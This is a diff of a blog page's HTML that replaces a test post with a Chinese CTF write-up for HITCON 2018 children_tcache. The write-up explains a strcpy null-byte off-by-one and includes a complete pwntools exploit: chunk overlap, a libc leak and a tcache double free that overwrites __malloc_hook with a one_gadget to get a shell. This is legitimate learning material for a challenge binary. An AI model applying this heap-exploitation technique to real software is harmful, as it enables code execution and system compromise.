@@ -70,7 +70,7 @@
 
 
 
-  <meta name="keywords" content="Hexo, NexT" />
+  <meta name="keywords" content="堆利用,off_by_one,overlapping,tcache," />
 
 
 
@@ -81,17 +81,18 @@
 
 
 
-<meta name="description" content="这是一个测试1234567#include &amp;lt;stdio.h&amp;gt;int main()&amp;#123;    printf(&quot;hello world&quot;);    return 0;&amp;#125;">
+<meta name="description" content="第一次参加HITCON CTF，之前在学堆利用的时候倒是做过几道往年的题，自我感觉还挺不错的，结果就爆零了23333。前几天就在网上看到了这题的writeup，一直拖到今天才拿来学习了一波，看完感觉自己是真的菜。。。  题目描述题目来源：HITCON CTF 2018">
+<meta name="keywords" content="堆利用,off_by_one,overlapping,tcache">
 <meta property="og:type" content="article">
-<meta property="og:title" content="test">
-<meta property="og:url" content="https://hpasserby.me/post/d87f7e0c.html">
+<meta property="og:title" content="Hitcon2018 children_tcache writeup">
+<meta property="og:url" content="https://hpasserby.me/post/cdad9cf7.html">
 <meta property="og:site_name" content="Hpasserby">
-<meta property="og:description" content="这是一个测试1234567#include &amp;lt;stdio.h&amp;gt;int main()&amp;#123;    printf(&quot;hello world&quot;);    return 0;&amp;#125;">
+<meta property="og:description" content="第一次参加HITCON CTF，之前在学堆利用的时候倒是做过几道往年的题，自我感觉还挺不错的，结果就爆零了23333。前几天就在网上看到了这题的writeup，一直拖到今天才拿来学习了一波，看完感觉自己是真的菜。。。  题目描述题目来源：HITCON CTF 2018">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:updated_time" content="2018-09-29T16:08:23.721Z">
+<meta property="og:updated_time" content="2018-10-27T12:04:32.017Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="test">
-<meta name="twitter:description" content="这是一个测试1234567#include &amp;lt;stdio.h&amp;gt;int main()&amp;#123;    printf(&quot;hello world&quot;);    return 0;&amp;#125;">
+<meta name="twitter:title" content="Hitcon2018 children_tcache writeup">
+<meta name="twitter:description" content="第一次参加HITCON CTF，之前在学堆利用的时候倒是做过几道往年的题，自我感觉还挺不错的，结果就爆零了23333。前几天就在网上看到了这题的writeup，一直拖到今天才拿来学习了一波，看完感觉自己是真的菜。。。  题目描述题目来源：HITCON CTF 2018">
 
 
 
@@ -121,13 +122,13 @@
 
 
 
-  <link rel="canonical" href="https://hpasserby.me/post/d87f7e0c.html"/>
+  <link rel="canonical" href="https://hpasserby.me/post/cdad9cf7.html"/>
 
 
 
 
 
-  <title>test | Hpasserby</title>
+  <title>Hitcon2018 children_tcache writeup | Hpasserby</title>
   
 
 
@@ -301,7 +302,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="https://hpasserby.me/post/d87f7e0c.html">
+    <link itemprop="mainEntityOfPage" href="https://hpasserby.me/post/cdad9cf7.html">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="Hpasserby">
@@ -318,7 +319,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">test</h1>
+          <h1 class="post-title" itemprop="name headline">Hitcon2018 children_tcache writeup</h1>
         
 
         <div class="post-meta">
@@ -330,8 +331,8 @@
               
                 <span class="post-meta-item-text">发表于</span>
               
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-09-29T10:36:11+08:00">
-                2018-09-29
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-10-27T18:11:03+08:00">
+                2018-10-27
               </time>
             
 
@@ -341,6 +342,28 @@
           </span>
 
           
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/writeips/" itemprop="url" rel="index">
+                    <span itemprop="name">writeips</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
 
           
             
@@ -348,7 +371,7 @@
 
           
           
-             <span id="/post/d87f7e0c.html" class="leancloud_visitors" data-flag-title="test">
+             <span id="/post/cdad9cf7.html" class="leancloud_visitors" data-flag-title="Hitcon2018 children_tcache writeup">
                <span class="post-meta-divider">|</span>
                <span class="post-meta-item-icon">
                  <i class="fa fa-eye"></i>
@@ -379,7 +402,19 @@
       
 
       
-        <h1 id="这是一个测试"><a href="#这是一个测试" class="headerlink" title="这是一个测试"></a>这是一个测试</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"hello world"</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+        <blockquote>
+<p>第一次参加HITCON CTF，之前在学堆利用的时候倒是做过几道往年的题，自我感觉还挺不错的，结果就爆零了23333。前几天就在网上看到了这题的writeup，一直拖到今天才拿来学习了一波，看完感觉自己是真的菜。。。</p>
+</blockquote>
+<h2 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h2><p>题目来源：HITCON CTF 2018<br><a id="more"></a><br>题目界面：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$$$$$$$$$$$$$$$$$$$$$$$$$$$</span><br><span class="line">🍊    Children Tcache    🍊</span><br><span class="line">$$$$$$$$$$$$$$$$$$$$$$$$$$$</span><br><span class="line">$   <span class="number">1.</span> New heap           $</span><br><span class="line">$   <span class="number">2.</span> Show heap          $</span><br><span class="line">$   <span class="number">3.</span> Delete heap        $ </span><br><span class="line">$   <span class="number">4.</span> Exit               $ </span><br><span class="line">$$$$$$$$$$$$$$$$$$$$$$$$$$$</span><br><span class="line">Your choice:</span><br></pre></td></tr></table></figure></p>
+<p>保护全开：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64<span class="number">-64</span>-little</span><br><span class="line">RELRO:    Full RELRO</span><br><span class="line">Stack:    Canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      PIE enabled</span><br><span class="line">FORTIFY:  Enabled</span><br></pre></td></tr></table></figure></p>
+<h2 id="漏洞情况"><a href="#漏洞情况" class="headerlink" title="漏洞情况"></a>漏洞情况</h2><p><strong>new_heap</strong>函数中:<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">  <span class="built_in">printf</span>(<span class="string">"Size:"</span>);</span><br><span class="line">  size = get_num();</span><br><span class="line">  <span class="keyword">if</span> ( size &gt; <span class="number">0x2000</span> )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-2</span>);</span><br><span class="line">  dest = (<span class="keyword">char</span> *)<span class="built_in">malloc</span>(size);</span><br><span class="line">  <span class="keyword">if</span> ( !dest )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Data:"</span>);</span><br><span class="line">  get_str((__int64)&amp;s, size);</span><br><span class="line">  <span class="built_in">strcpy</span>(dest, &amp;s);</span><br><span class="line">  data_list[i] = dest;</span><br><span class="line">  size_list[i] = size;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v5;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>因为strcpy函数在拷贝字符串时，最后的’\0’也会一起拷贝，所以当输入的字符串已经占满了所分配的内存，那最后的’\0’会往后溢出一个字节，导致了<strong>null byte off_by_one</strong>。</p>
+<blockquote>
+<p>看到<strong>null byte off_by_one</strong>，我首先就想到构造chunk overlapping，然而太菜。不够熟悉tcache以及overlap，所以到最后也没做出来</p>
+</blockquote>
+<h2 id="笔记"><a href="#笔记" class="headerlink" title="笔记"></a>笔记</h2><p>这题目其实不难，前面一部分都是标准的overlaping的流程，只是因为多了tcache，所以要不停的填充和清空tcache，来保证我们的chunk不受它的影响。真正利用tcache的地方只有最后的double free(tcache dup)。<br>为了省时间就不单独分析了，直接写在exp里，赶作业要紧。。。。。</p>
+<h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.terminal = [<span class="string">'gnome-terminal'</span>, <span class="string">'-x'</span>, <span class="string">'sh'</span>, <span class="string">'-c'</span>]</span><br><span class="line"><span class="comment">#context.log_level = 'debug'</span></span><br><span class="line">elf = ELF(<span class="string">'./children_tcache'</span>)</span><br><span class="line">libc = ELF(<span class="string">'./libc.so.6'</span>)</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">'./children_tcache'</span>, env=&#123;<span class="string">'LD_PRELOAD'</span>:<span class="string">'./libc.so.6'</span>&#125;)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size, content)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'Your choice: '</span>)</span><br><span class="line">    p.sendline(<span class="string">'1'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'Size:'</span>)</span><br><span class="line">    p.sendline(str(size))</span><br><span class="line">    p.recvuntil(<span class="string">'Data:'</span>)</span><br><span class="line">    p.send(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(index)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'Your choice: '</span>)</span><br><span class="line">    p.sendline(<span class="string">'2'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'Index:'</span>)</span><br><span class="line">    p.sendline(str(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dele</span><span class="params">(index)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'Your choice: '</span>)</span><br><span class="line">    p.sendline(<span class="string">'3'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'Index:'</span>)</span><br><span class="line">    p.sendline(str(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add_7_times</span><span class="params">(size)</span>:</span></span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> range(<span class="number">7</span>):</span><br><span class="line">        add(size, <span class="string">'xxxx'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">del_7_times</span><span class="params">(fr, to)</span>:</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(fr, to):</span><br><span class="line">        dele(i)</span><br><span class="line"></span><br><span class="line"><span class="comment">#现在堆的前面把这些用于填充tcache的chunk分配好，以免破坏后面堆的布局</span></span><br><span class="line">add_7_times(<span class="number">0x80</span>) <span class="comment">#0-6</span></span><br><span class="line">del_7_times(<span class="number">0</span>, <span class="number">7</span>)</span><br><span class="line"></span><br><span class="line">add_7_times(<span class="number">0x100</span>) <span class="comment">#0-6，填充tcache 0x110</span></span><br><span class="line">add(<span class="number">0x108</span>, <span class="string">'7777'</span>) <span class="comment">#7 chunk_A</span></span><br><span class="line">add(<span class="number">0x100</span>, <span class="string">'8888'</span>) <span class="comment">#8 chunk_B</span></span><br><span class="line">add(<span class="number">0x100</span>, <span class="string">'9999'</span>) <span class="comment">#9 chunk_C</span></span><br><span class="line">del_7_times(<span class="number">0</span>, <span class="number">7</span>)</span><br><span class="line"></span><br><span class="line">dele(<span class="number">8</span>) <span class="comment">#释放chunk_B，tcache已满，放入unsortedbin</span></span><br><span class="line">dele(<span class="number">7</span>) <span class="comment">#释放chunk_A</span></span><br><span class="line"></span><br><span class="line">add_7_times(<span class="number">0x100</span>) <span class="comment">#0-6</span></span><br><span class="line">add(<span class="number">0x108</span>, <span class="string">'7'</span>*<span class="number">0x108</span>) <span class="comment">#7 从chunk_A溢出(null byte off_by_one)修改了chunk_B的size(0x110--&gt;0x100)</span></span><br><span class="line">del_7_times(<span class="number">0</span>, <span class="number">7</span>)</span><br><span class="line"></span><br><span class="line">add_7_times(<span class="number">0x80</span>)</span><br><span class="line">add(<span class="number">0x80</span>, <span class="string">'8888'</span>) <span class="comment">#8 chunk_b1 从chunk_B中分割下来，因为size被改，所以chunk_C的prevsize得不到维护</span></span><br><span class="line">del_7_times(<span class="number">0</span>, <span class="number">7</span>)</span><br><span class="line">add(<span class="number">0x60</span>, <span class="string">'aaaa'</span>) <span class="comment">#0 chunk_b2 将chunk_B剩下部分都取出来，chunk_C的prvesize同样没有被维护</span></span><br><span class="line"></span><br><span class="line">dele(<span class="number">8</span>) <span class="comment">#释放b1</span></span><br><span class="line">dele(<span class="number">9</span>) <span class="comment">#overlap!!触发从chunk_b1到topchunk的合并，其中包含了未被释放的chunk_b2</span></span><br><span class="line">        <span class="comment">#topchunk位于chunk_b1的位置。</span></span><br><span class="line"></span><br><span class="line">add_7_times(<span class="number">0x80</span>) <span class="comment">#1-6 8</span></span><br><span class="line">add(<span class="number">0x80</span>, <span class="string">'xxxx'</span>) <span class="comment">#9，重新分配chunk_b1，现在topchunk和chunk_b2重合</span></span><br><span class="line">del_7_times(<span class="number">1</span>, <span class="number">7</span>) <span class="comment">#回填tcache 0x90</span></span><br><span class="line">dele(<span class="number">8</span>) <span class="comment">#回填tcache 0x90，剩0(chunk_b2) 7(chunk_A) 9(chunk_b1)</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x500</span>, <span class="string">'1111'</span>) <span class="comment">#1，该chunk和0重合</span></span><br><span class="line">add(<span class="number">0x120</span>, <span class="string">'2222'</span>) <span class="comment">#2，防止被topchunk合并</span></span><br><span class="line">dele(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">show(<span class="number">0</span>)<span class="comment">#泄漏libc</span></span><br><span class="line">libc_base = u64(p.recvline()[:<span class="number">-1</span>].ljust(<span class="number">8</span>, <span class="string">'\x00'</span>)) - <span class="number">0x3ebca0</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">"libc_base: %#x"</span> % libc_base</span><br><span class="line">malloc_hook = libc.symbols[<span class="string">'__malloc_hook'</span>] + libc_base</span><br><span class="line"><span class="keyword">print</span> <span class="string">"malloc_hook: %#x"</span> % malloc_hook</span><br><span class="line">one_gadget = libc_base + <span class="number">0x10a38c</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">"one_gadget: %#x"</span> % one_gadget</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x120</span>, <span class="string">'1111'</span>) <span class="comment">#1 从0x500大小的chunk中分割出0x120。0和1都指向该chunk</span></span><br><span class="line">dele(<span class="number">0</span>) <span class="comment">#放入tcache</span></span><br><span class="line">dele(<span class="number">1</span>) <span class="comment">#再次放入tcache，double free</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x120</span>, p64(malloc_hook)) <span class="comment">#修改fd为malloc_hook</span></span><br><span class="line">add(<span class="number">0x120</span>, <span class="string">'aaaa'</span>) </span><br><span class="line">add(<span class="number">0x120</span>, p64(one_gadget)) <span class="comment">#修改malloc_hook为one_gadget</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'Your choice: '</span>) <span class="comment">#getshell</span></span><br><span class="line">p.sendline(<span class="string">'1'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'Size:'</span>)</span><br><span class="line">p.sendline(<span class="string">'123'</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<h2 id="相关链接"><a href="#相关链接" class="headerlink" title="相关链接"></a>相关链接</h2><p>题目链接：<a href="https://github.com/Hpasserby/pwn_learn/raw/master/heapLearn/challenges/Hitcon2018/children_tcache/children_tcache.zip" target="_blank" rel="noopener">children_tcache</a><br>exp参考：<a href="https://xz.aliyun.com/t/2953" target="_blank" rel="noopener">HITCON2018-WP-By Nu1L</a></p>
 
       
     </div>
@@ -395,6 +430,18 @@
 
     <footer class="post-footer">
       
+        <div class="post-tags">
+          
+            <a href="/tags/堆利用/" rel="tag"># 堆利用</a>
+          
+            <a href="/tags/off-by-one/" rel="tag"># off_by_one</a>
+          
+            <a href="/tags/overlapping/" rel="tag"># overlapping</a>
+          
+            <a href="/tags/tcache/" rel="tag"># tcache</a>
+          
+        </div>
+      
 
       
       
@@ -404,15 +451,15 @@
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
+              <a href="/post/f8f8701e.html" rel="next" title="堆利用学习之house of orange">
+                <i class="fa fa-chevron-left"></i> 堆利用学习之house of orange
+              </a>
+            
           </div>
 
           <span class="post-nav-divider"></span>
 
           <div class="post-nav-prev post-nav-item">
-            
-              <a href="/post/dbc7b210.html" rel="prev" title="堆利用学习之unlink">
-                堆利用学习之unlink <i class="fa fa-chevron-right"></i>
-              </a>
             
           </div>
         </div>
@@ -565,7 +612,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#这是一个测试"><span class="nav-number">1.</span> <span class="nav-text">这是一个测试</span></a></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#题目描述"><span class="nav-number">1.</span> <span class="nav-text">题目描述</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#漏洞情况"><span class="nav-number">2.</span> <span class="nav-text">漏洞情况</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#笔记"><span class="nav-number">3.</span> <span class="nav-text">笔记</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#exp"><span class="nav-number">4.</span> <span class="nav-text">exp</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#相关链接"><span class="nav-number">5.</span> <span class="nav-text">相关链接</span></a></li></ol></div>
             
 
           </div>
